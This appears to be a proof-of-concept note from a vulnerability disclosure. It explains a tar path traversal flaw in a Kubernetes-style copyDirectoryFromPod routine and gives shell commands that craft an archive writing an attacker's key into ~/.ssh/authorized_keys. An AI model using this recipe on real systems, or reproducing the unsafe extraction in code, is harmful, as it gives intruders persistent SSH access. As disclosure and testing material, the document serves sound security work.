// Attacker controls a pod that returns a crafted tar archive.
// The tar archive contains an entry with a traversal path:
// Entry name: ../../.ssh/authorized_keys
// Entry content: attacker's SSH public key

// The vulnerable code resolves:
// new File(destination.toFile(), "../../.ssh/authorized_keys")
// = destination/../../.ssh/authorized_keys
// = (two dirs up from destination)/.ssh/authorized_keys

// In a typical deployment where destination=/tmp/extracted,
// this resolves to /root/.ssh/authorized_keys or /home/user/.ssh/authorized_keys

// To create a malicious tar archive for testing:
// $ mkdir -p craft && cd craft
// $ mkdir -p actual_dir
// $ echo 'ssh-rsa AAAA...attacker_key' > evil_key
// $ tar czf - --transform 's,evil_key,../../.ssh/authorized_keys,' evil_key | base64

// When copyDirectoryFromPod processes this:
// File f = new File("/tmp/extracted", "../../.ssh/authorized_keys");
// // f.getAbsolutePath() == "/home/user/.ssh/authorized_keys"
